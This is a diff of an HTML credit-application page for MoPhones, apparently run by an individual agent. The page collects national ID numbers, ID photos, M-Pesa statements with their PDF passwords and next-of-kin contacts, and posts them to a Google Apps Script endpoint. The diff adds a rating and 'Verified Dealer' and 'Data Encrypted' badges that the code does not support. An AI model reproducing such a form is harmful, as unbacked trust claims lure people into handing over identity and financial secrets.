@@ -3,147 +3,143 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoPhones Application</title>
+    <title>MoPhones | Secure Credit Portal</title>
     <style>
-        :root { --primary: #004488; --danger: #dc2626; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f1f5f9; padding: 15px; margin: 0; }
-        .container { background: white; padding: 20px; border-radius: 15px; max-width: 480px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        .header { text-align: center; margin-bottom: 20px; }
-        .strict-banner { background: #fff1f2; border: 1px solid var(--danger); color: var(--danger); padding: 12px; border-radius: 8px; font-size: 0.85em; margin-bottom: 20px; text-align: center; line-height: 1.4; }
-        .price-check { background: #e0f2fe; padding: 10px; border-radius: 8px; text-align: center; margin-bottom: 15px; font-size: 0.9em; }
-        .price-check a { color: var(--primary); font-weight: bold; text-decoration: none; }
+        :root { --primary: #004488; --dark-blue: #0f172a; --danger: #dc2626; --success: #16a34a; --card-bg: #ffffff; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: var(--dark-blue); padding: 20px 15px; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .container { background: var(--card-bg); padding: 30px 25px; border-radius: 20px; max-width: 480px; width: 100%; box-shadow: 0 15px 35px rgba(0,0,0,0.5); position: relative; }
+        
+        .header { text-align: center; margin-bottom: 5px; }
+        .rating { color: #f59e0b; font-size: 0.9em; font-weight: bold; text-align: center; margin-bottom: 15px; }
+        
+        .trust-badges { display: flex; justify-content: center; gap: 8px; margin-bottom: 20px; font-size: 0.7em; color: #64748b; }
+        .badge { background: #f8fafc; padding: 4px 10px; border-radius: 20px; border: 1px solid #e2e8f0; font-weight: 500; }
+
+        .strict-banner { background: #fff1f2; border: 1px solid var(--danger); color: var(--danger); padding: 12px; border-radius: 10px; font-size: 0.85em; margin-bottom: 20px; text-align: center; line-height: 1.4; }
+        
         label { display: block; margin-top: 15px; font-weight: bold; font-size: 0.85em; color: #334155; }
-        input, select { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
-        .file-section { background: #f8fafc; border: 1px dashed #cbd5e1; padding: 10px; border-radius: 8px; margin-top: 5px; }
-        .btn-submit { background: var(--primary); color: white; padding: 18px; border: none; border-radius: 8px; width: 100%; margin-top: 25px; font-weight: bold; font-size: 1.1em; cursor: pointer; }
-        .btn-submit:disabled { background: #94a3b8; }
-        .contact-box { margin-top: 25px; text-align: center; border-top: 1px solid #e2e8f0; padding-top: 15px; font-size: 0.9em; }
-        .contact-box a { color: var(--primary); text-decoration: none; font-weight: bold; }
-        .footer { font-size: 0.7em; text-align: center; color: #94a3b8; margin-top: 20px; }
+        input, select { width: 100%; padding: 12px; margin-top: 5px; border: 2px solid #cbd5e1; border-radius: 10px; box-sizing: border-box; font-size: 16px; transition: all 0.3s ease; outline: none; }
+        
+        input:focus { border-color: var(--primary); box-shadow: 0 0 8px rgba(0,68,136,0.2); }
+        input:valid:not(:placeholder-shown) { border-color: var(--success); background-color: #f0fdf4; }
+
+        .file-section { background: #f8fafc; border: 2px dashed #cbd5e1; padding: 12px; border-radius: 10px; margin-top: 5px; }
+
+        .btn-submit { background: var(--primary); color: white; padding: 18px; border: none; border-radius: 10px; width: 100%; margin-top: 30px; font-weight: bold; font-size: 1.1em; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; transition: transform 0.2s; }
+        .btn-submit:hover { transform: translateY(-2px); background: #003366; }
+        .btn-submit:disabled { background: #94a3b8; transform: none; }
+
+        .whatsapp-float { position: fixed; bottom: 25px; right: 25px; background-color: #25d366; color: white; width: 60px; height: 60px; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 5px 15px rgba(0,0,0,0.3); z-index: 100; text-decoration: none; transition: 0.3s; }
+        .whatsapp-float:hover { transform: scale(1.1); }
+
+        .loader { width: 20px; height: 20px; border: 3px solid #FFF; border-bottom-color: transparent; border-radius: 50%; display: none; animation: rotation 1s linear infinite; }
+        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .footer { font-size: 0.75em; text-align: center; color: #94a3b8; margin-top: 25px; padding-bottom: 40px; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="120">
-        <h2 style="color: var(--primary); margin-top: 10px;">MoPhones Application</h2>
+        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="130">
     </div>
+    <div class="rating">⭐ 4.8/5 Customer Rating</div>
 
-    <div class="price-check">
-        Verify current handset prices at <a href="https://mophones.co" target="_blank">mophones.co</a>
+    <div class="trust-badges">
+        <span class="badge">✅ Verified Dealer</span>
+        <span class="badge">🔒 Data Encrypted</span>
+        <span class="badge">⚡ Fast Track Approval</span>
     </div>
 
     <div class="strict-banner">
-        🚨 <strong>VALIDATION ACTIVE</strong><br>
-        Dishonesty during the subsequent <strong>Credit Call</strong> will lead to automatic credit disqualification.
+        🚨 <strong>CREDIT NOTICE:</strong> Dishonesty during the <strong>Credit Call</strong> will lead to automatic disqualification.
     </div>
 
     <form id="ironCladPortal">
         <label>Phone Model Preferred</label>
-        <input type="text" name="preferred_phone" placeholder="e.g. Samsung Galaxy A15" required>
+        <input type="text" name="preferred_phone" placeholder="e.g. Samsung A15" required>
 
-        <label>Full Name (Must be 3 Names)</label>
+        <label>Full Name (3 Names as on ID)</label>
         <input type="text" name="full_name" id="nameInput" placeholder="First Middle Surname" required>
 
+        <label>Email Address</label>
+        <input type="email" name="customer_email" placeholder="for confirmation email" required>
+
         <label>National ID Number</label>
-        <input type="text" name="id_number" id="idInput" maxlength="8" minlength="7" placeholder="7-8 Digits" required>
+        <input type="text" name="id_number" maxlength="8" minlength="7" placeholder="ID Number" required>
 
-        <label>Region of Residence</label>
-        <select name="region" required>
-            <option value="">-- Select --</option>
-            <option value="Nairobi">Nairobi</option>
-            <option value="Kiambu">Kiambu</option>
-            <option value="Nakuru">Nakuru</option>
-            <option value="Machakos">Machakos</option>
-            <option value="Kajiado">Kajiado</option>
-        </select>
-
-        <label>ID Front Image</label>
+        <label>ID Front & Back Images</label>
         <div class="file-section"><input type="file" name="id_front" accept="image/*" required></div>
-
-        <label>ID Back Image</label>
-        <div class="file-section"><input type="file" name="id_back" accept="image/*" required></div>
+        <div class="file-section" style="margin-top:10px;"><input type="file" name="id_back" accept="image/*" required></div>
 
         <label>12 Months M-Pesa Statement (PDF)</label>
         <div class="file-section"><input type="file" name="mpesa_statement" accept=".pdf" required></div>
 
-        <label>M-Pesa Statement Password</label>
-        <input type="text" name="mpesa_password" id="passInput" placeholder="Password for PDF" required>
-
-        <label>Next of Kin Name</label>
-        <input type="text" name="nok_name" required>
+        <label>Statement Password</label>
+        <input type="text" name="mpesa_password" placeholder="PDF Password" required>
 
         <label>Next of Kin Contact</label>
-        <input type="text" name="nok_contact" id="kinContact" value="+254" minlength="13" maxlength="13" required>
+        <input type="text" name="nok_contact" id="kinContact" value="+254" required>
 
-        <button type="submit" class="btn-submit" id="submitBtn">Submit Application</button>
+        <button type="submit" class="btn-submit" id="submitBtn">
+            <span class="loader" id="btnLoader"></span>
+            <span id="btnText">Submit Application</span>
+        </button>
     </form>
+</div>
 
-    <div class="contact-box">
-        Need assistance? <br>
-        Contact us: <a href="tel:0112384099">0112384099</a>
-    </div>
+<a href="https://wa.me/254112384099?text=Hello%20Akeya,%20I%20need%20help%20with%20my%20MoPhones%20application" class="whatsapp-float" target="_blank">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" width="35">
+</a>
 
-    <div class="footer">Portal Code: jeez</div>
+<div class="footer">
+    Portal Code: <strong>mo_leads_portal</strong><br>
+    Assigned Agent: <strong>Akeya Lilian</strong>
 </div>
 
 <script>
-const scriptURL = 'https://script.google.com/macros/s/AKfycbz8ENnIsv-O9KH9uZeMZNwbK2zTMvDEI74v1OyE0BHidl_KHTFYh9PW_ptyvlVmLhQu/exec';
+// UPDATED URL: 
+const scriptURL = 'https://script.google.com/macros/s/AKfycbzeYIiyr3DVx__3giSLBkzahoD9sXg2vC3IerUSW8PqrwiwuA4CHOTuLpKh5Dh8QWNm/exec';
+
 const form = document.getElementById('ironCladPortal');
 const submitBtn = document.getElementById('submitBtn');
+const btnLoader = document.getElementById('btnLoader');
+const btnText = document.getElementById('btnText');
 
 form.addEventListener('submit', e => {
     e.preventDefault();
-
-    // Validations
-    const nameValue = document.getElementById('nameInput').value.trim();
-    if (nameValue.split(/\s+/).length < 3) {
-        alert("❌ ERROR: You must provide exactly 3 names as they appear on your ID.");
-        return;
+    if (document.getElementById('nameInput').value.trim().split(/\s+/).length < 3) {
+        alert("❌ Error: You must enter 3 names exactly as they appear on your ID."); return;
     }
 
     submitBtn.disabled = true;
-    submitBtn.innerText = "Uploading Files... Please wait.";
+    btnLoader.style.display = "inline-block";
+    btnText.innerText = "Securing Documents...";
 
     const formData = {};
     const fileInputs = form.querySelectorAll('input[type="file"]');
-    const textInputs = form.querySelectorAll('input:not([type="file"]), select');
-
-    textInputs.forEach(input => formData[input.name] = input.value);
+    form.querySelectorAll('input:not([type="file"]), select').forEach(input => formData[input.name] = input.value);
 
     const promises = Array.from(fileInputs).map(input => {
         return new Promise((resolve) => {
             const file = input.files[0];
             if (!file) { resolve(); return; }
             const reader = new FileReader();
-            reader.onload = (event) => {
-                formData[input.name] = event.target.result; 
-                resolve();
-            };
+            reader.onload = (event) => { formData[input.name] = event.target.result; resolve(); };
             reader.readAsDataURL(file);
         });
     });
 
     Promise.all(promises).then(() => {
-        fetch(scriptURL, {
-            method: 'POST',
-            mode: 'no-cors', 
-            body: JSON.stringify(formData)
+        fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(formData) })
+        .then(() => { 
+            alert("✅ SUCCESS! Your application is in. Check your email for confirmation from Akeya Lilian Mophones."); 
+            form.reset(); window.location.reload(); 
         })
-        .then(() => {
-            alert("✅ SUCCESS: Your MoPhones application has been submitted. Prepare for the credit call!");
-            form.reset();
-            window.location.reload();
-        })
-        .catch(err => {
-            alert("Network Error. Please try again.");
-            submitBtn.disabled = false;
-            submitBtn.innerText = "Submit Application";
-        });
+        .catch(() => { alert("Submission failed. Check your internet."); submitBtn.disabled = false; btnLoader.style.display = "none"; btnText.innerText = "Submit Application"; });
     });
 });
 </script>
-
 </body>
 </html>
